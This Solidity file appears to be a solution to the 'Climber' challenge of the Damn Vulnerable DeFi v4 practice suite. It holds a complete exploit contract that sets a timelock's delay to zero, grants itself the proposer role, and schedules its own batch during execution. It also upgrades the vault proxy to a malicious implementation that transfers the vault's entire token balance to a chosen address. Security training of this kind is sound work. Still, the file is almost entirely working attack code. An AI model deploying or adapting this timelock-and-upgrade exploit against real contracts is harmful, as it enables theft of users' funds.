// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {PROPOSER_ROLE} from "../../src/climber/ClimberConstants.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

// Define interface to interact with UUPS upgrade mechanism through the proxy
interface IVaultUUPS {
    function upgradeToAndCall(
        address newImplementation,
        bytes calldata data
    ) external;
}

contract ClimberAttacker {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address recovery;
    IVaultUUPS uupsVault;

    uint256 len = 4;
    address[] targets = new address[](len);
    uint256[] values = new uint256[](len);
    bytes[] dataElements = new bytes[](len);
    uint256 tokenBalance = 10_000_000e18;

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        DamnValuableToken _token,
        address _recovery
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;

        // Cast the proxy to the UUPS interface so we can encode the upgrade selector
        uupsVault = IVaultUUPS(address(vault));
    }

    function attack() external {
        // Step 1: Update delay to 0 so execute() can immediately run scheduled operations
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0
        );

        // Step 2: Grant PROPOSER_ROLE to this contract, allowing it to schedule operations
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        // Step 3: Upgrade vault to malicious implementation and call `collect()` immediately
        targets[2] = address(uupsVault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            uupsVault.upgradeToAndCall.selector,
            address(new ClimberVaultV2()), // Malicious implementation
            abi.encodeWithSelector(
                ClimberVaultV2.collect.selector,
                address(token),
                address(recovery)
            )
        );

        // Step 4: During execution, schedule this exact batch so that timelock doesn't revert
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(this.addSchedule.selector);

        // Execute all steps atomically using the timelock contract
        timelock.execute(targets, values, dataElements, 0);
    }

    // This is called within the execute() to back-schedule the same batch
    function addSchedule() external {
        timelock.schedule(targets, values, dataElements, 0);
    }
}

// Malicious vault implementation with public function to drain funds
contract ClimberVaultV2 is ClimberVault {
    function collect(address _token, address recipient) external onlyOwner {
        DamnValuableToken(_token).transfer(
            recipient,
            DamnValuableToken(_token).balanceOf(address(this))
        );
    }
}
